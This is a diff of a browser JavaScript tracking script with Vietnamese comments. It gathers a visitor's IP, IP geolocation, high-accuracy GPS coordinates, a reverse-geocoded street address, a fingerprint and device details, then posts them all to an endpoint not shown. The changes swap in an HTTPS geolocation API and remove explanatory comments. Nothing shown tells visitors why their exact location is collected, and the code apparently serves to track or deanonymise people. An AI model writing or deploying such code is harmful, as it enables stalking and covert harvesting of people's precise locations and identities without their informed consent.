@@ -47,34 +47,37 @@ async function run() {
 
   const screenRes = `${window.screen.width}x${window.screen.height}`;
 
-  // --- Lấy IP + vị trí từ IP ---
+  // --- Lấy IP + vị trí từ IP (dùng ipwho.is hỗ trợ https) ---
   let ip = "?", city = "?", region = "?", country = "?", isp = "?";
   let ipLat = "?", ipLon = "?";
 
   try {
-    const geo = await (await fetch("http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query")).json();
-    if (geo.status === "success") {
-      ip = geo.query; city = geo.city; region = geo.regionName;
-      country = geo.country; isp = geo.isp;
-      ipLat = geo.lat; ipLon = geo.lon;
+    const geo = await (await fetch("https://ipwho.is/")).json();
+    if (geo.success) {
+      ip      = geo.ip;
+      city    = geo.city;
+      region  = geo.region;
+      country = geo.country;
+      isp     = geo.connection?.isp || "?";
+      ipLat   = geo.latitude;
+      ipLon   = geo.longitude;
     }
   } catch(e) {
     try { ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip; } catch(e2){}
   }
 
   // --- Xin quyền GPS + Reverse Geocoding ---
-  let gpsAddress  = "Không cho phép";   // địa chỉ đầy đủ từ GPS
+  let gpsAddress  = "Không cho phép";
   let gpsLat      = "?";
   let gpsLon      = "?";
-  let gpsAccuracy = "?";                // độ chính xác (mét)
+  let gpsAccuracy = "?";
 
   try {
-    // Xin quyền GPS — người dùng sẽ thấy hộp thoại cho phép/từ chối
     const pos = await new Promise((resolve, reject) =>
       navigator.geolocation.getCurrentPosition(resolve, reject, {
-        timeout: 8000,           // chờ tối đa 8 giây
+        timeout: 8000,
         maximumAge: 0,
-        enableHighAccuracy: true // yêu cầu GPS chính xác cao
+        enableHighAccuracy: true
       })
     );
 
@@ -82,8 +85,7 @@ async function run() {
     gpsLon      = pos.coords.longitude.toFixed(6);
     gpsAccuracy = Math.round(pos.coords.accuracy) + "m";
 
-    // Gọi Nominatim (OpenStreetMap) để chuyển tọa độ → địa chỉ
-    // Lưu ý: thêm header User-Agent theo yêu cầu của Nominatim
+    // Nominatim (OpenStreetMap) — chuyển tọa độ → địa chỉ tiếng Việt
     const nominatim = await fetch(
       `https://nominatim.openstreetmap.org/reverse?lat=${gpsLat}&lon=${gpsLon}&format=json&addressdetails=1&accept-language=vi`,
       { headers: { "User-Agent": "TrackingApp/1.0" } }
@@ -92,8 +94,6 @@ async function run() {
 
     if (place && place.address) {
       const a = place.address;
-
-      // Ghép địa chỉ theo chuẩn Việt Nam: số nhà + đường + phường + quận + tỉnh
       const parts = [
         a.house_number,
         a.road || a.pedestrian || a.footway,
@@ -101,17 +101,15 @@ async function run() {
         a.city_district || a.district,
         a.city || a.town || a.village,
         a.country
-      ].filter(Boolean); // bỏ các phần null/undefined
-
+      ].filter(Boolean);
       gpsAddress = parts.join(", ");
     }
 
   } catch(err) {
-    // Người dùng từ chối hoặc GPS không khả dụng
-    if (err.code === 1) gpsAddress = "Người dùng từ chối GPS";
+    if      (err.code === 1) gpsAddress = "Người dùng từ chối GPS";
     else if (err.code === 2) gpsAddress = "GPS không khả dụng";
     else if (err.code === 3) gpsAddress = "GPS timeout";
-    else gpsAddress = "Lỗi GPS";
+    else                     gpsAddress = "Lỗi GPS";
   }
 
   // --- Tạo fingerprint ---
@@ -126,14 +124,8 @@ async function run() {
       headers: { "Content-Type": "text/plain" },
       body   : JSON.stringify({
         fingerprint,
-        // Từ IP
-        ip, city, region, country, isp,
-        ipLat, ipLon,
-        // Từ GPS
-        gpsAddress,           // 👈 địa chỉ đầy đủ dạng text
-        gpsLat, gpsLon,
-        gpsAccuracy,
-        // Thiết bị
+        ip, city, region, country, isp, ipLat, ipLon,
+        gpsAddress, gpsLat, gpsLon, gpsAccuracy,
         userAgent: ua, os, browser, device,
         screen   : screenRes,
         language : navigator.language,
